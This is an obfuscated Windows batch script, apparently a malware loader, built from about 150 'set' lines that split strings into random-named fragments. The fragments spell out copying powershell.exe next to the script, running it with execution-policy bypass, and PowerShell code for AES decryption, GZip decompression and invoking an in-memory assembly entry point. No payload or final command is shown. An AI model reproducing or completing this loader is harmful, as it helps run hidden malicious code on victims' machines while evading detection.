@echo off
set "FGgYaEHFcX=Sy"
set "IodxgiBKCu=xe"
set "yXdHVZJdEs=do"
set "pMBWsmmiNk=s\"
set "yGOuALAXAE=ws"
set "daaMdeYFqI=he"
set "pHGUHomtnK=nd"
set "xCAhUnktjD=ll"
set "LvuXnMgRAS=y "
set "jCxGzyrZgH=we"
set "XVCnFSGZGE=co"
set "BxTogphbqd=1."
set "mnAKlpHtuW=:\"
set "awznXxSEBj=po"
set "QqUjmlRwKb=.e"
set "DOnCmsbRce=\v"
set "PIZJbhpaQq=0\"
set "vnPSoiiLKY=we"
set "fbfqsNRvDa=ow"
set "bdFcfyVhqN=32"
set "brgOqXgWTN=py"
set "VoEDWUdyPs=Po"
set "ALIxkAoxip= /"
set "dogJRtOfiH=st"
set "XTDyGCfJCu=em"
set "mfgNBktALb=he"
set "yhagnMdHsx=in"
set "gltFXbGRfY=\W"
set "dPFcCVOEAe=rs"
set "gIJjZVNFTp= C"
set "WknmWkRVgs=ll"
set "sDmNARsFFB=rS"
set "vUwAvOpgzV=Wi"
set "XRQfHolaot= %~dp0"
set "pfHdooZXLL=cd"
set "IMMVEnyLYa=$IJj"
set "ctGOzHiRuZ=mory"
set "gAXTiDxSDD=$kjG"
set "DRNbtFBqyV=j = "
set "EtAzSbGJhC=ach "
set "TZFSkOqIkL=16] "
set "gaKtzmNCMp=d;$a"
set "HuNruDgnVe=orF'"
set "sgciNNZFxJ=hNXJ"
set "HXcDNvwWNd=-4] "
set "ThImOniBWN== $a"
set "VleGfBCsxz=daeR"
set "XWoqSeMZjK=PKCS"
set "tSuUXtZOVq=; };"
set "jTqsrYToke=-ep "
set "TFbuDCejkO=join"
set "WmfCWxBoHB=ose("
set "iTdoFgPGVm=pres"
set "BIkwEkipWp=oryS"
set "iCAyEmHUDh=gvVP"
set "RyrnvnGNlZ=yste"
set "GLrHlXvJPv=[-1."
set "TksLmXytiV=Comp"
set "gryuugKQwU=ct S"
set "vVNIWVDFxq=);$w"
set "isvLkVNApP=se()"
set "UWGJEmkoZr=in $"
set "tjcnkhqugx=bypa"
set "lrnbyjCUas= New"
set "laJjijkDjd=)($B"
set "bXdyNGtofT=yTo("
set "kVtYbnIlCd=.Len"
set "DeNYibLqsQ=IJjs"
set "jHUCOFkNTA='[-1"
set "rOtDwbqmBb=Bmor"
set "WuKYQLsvHY=and "
set "fnWfDUbPjF=nage"
set "lNepaArrSS=]::C"
set "SpuKrsHKVM=hNXJ"
set "EYcTMhKwGh=TllA"
set "uQfpiOpEul=JP);"
set "gXPXKoHLVz=Mode"
set "HYAdcLPcxg=, (,"
set "QXoBlKeqOs=$QOi"
set "pBknoLKGkA=QzEY"
set "GwZmAxYjDE=);$c"
set "VqlwrjiypL=Syst"
set "USqurbufRn=-Obj"
set "QtmmDBppkb=y.Pa"
set "iTbHARhjhX=f.Pa"
set "wgSjqhWWWh=ddin"
set "MklgeIJyJE=yj, "
set "OdTwOfbTHH=yste"
set "boskmyfPXD=e]::"
set "VzXQUQJVcj=rofi"
set "jyoONyqXYt=aP.T"
set "RscBfmlzso=ptog"
set "PvWkTNfFLD=hNXJ"
set "KDIpqvXMJn=oin "
set "WMjUvtriLf=g = "
set "vkwVslfJnj=ateD"
set "CQkHBWRtKB=O.Me"
set "FmHpzgddPy=Invo"
set "lMrIWcVrMy=P, 0"
set "aHkjhjwKGZ=m(, "
set "dHUcqvjwTr=bstr"
set "OOTcXrvRqd=W) {"
set "CHSNlbcljy=LOGf"
set "utEJTzHvmn=tryP"
set "ZWoswInZgt= = $"
set "rZeOqdqSHB=bMsv"
set "fwaEZhqbzF=;$QO"
set "hgiXQnCUsh=pStr"
set "UvGBhTUYpn=pDZz"
set "gftXPOlRHo=sGUc"
set "Kqgcfefdfu=null"
set "lkjcHXclyr=oL'["
set "jGbSDHaiJQ=$aLO"
set "iSbUuySjIG=m.Re"
set "zLXMKRGZON=VPT "
set "RcaHJTVTlF= = N"
set "hKWhTFekRu=rans"
set "wAVfLNuWri=gth)"
set "SmJyarZMzk=Syst"
set "HEyeiFPgiI=oint"
set "bIsMnZSuOx=ode]"
set "fJLJFnyEZS=.Cry"
set "TGsnWPAuYr=NL.T"
set "aaYvQxUzPc=[]] "
set "xlFyYjARIm=lBlo"
set "QQVyxWAZBh=($Qz"
set "wvSmdtIgmC='gni"
set "eYpbODgDfS=trea"
set "YGQZBdVxBh=.Cre"
set "RtXVEuNMqK=Star"
set "sKIggZLvRI=3); "
set "IDamAQPQzF=ing("
set "AhyfKAMPIQ=tem."
set "hYNAKQlaDR=UGTu"
set "ipENUFrVfW=EAIO"
set "awqsCXOrSg=y.Cr"
set "uKHlffKxOV=.-16"
set "ucJzAawgae=tem."
set "xRMJtuCVqv== [S"
set "ukePCiwRMN=).Sp"
set "ELXYHSSUgZ=tS46"
set "VfXRKSLblD=();$"
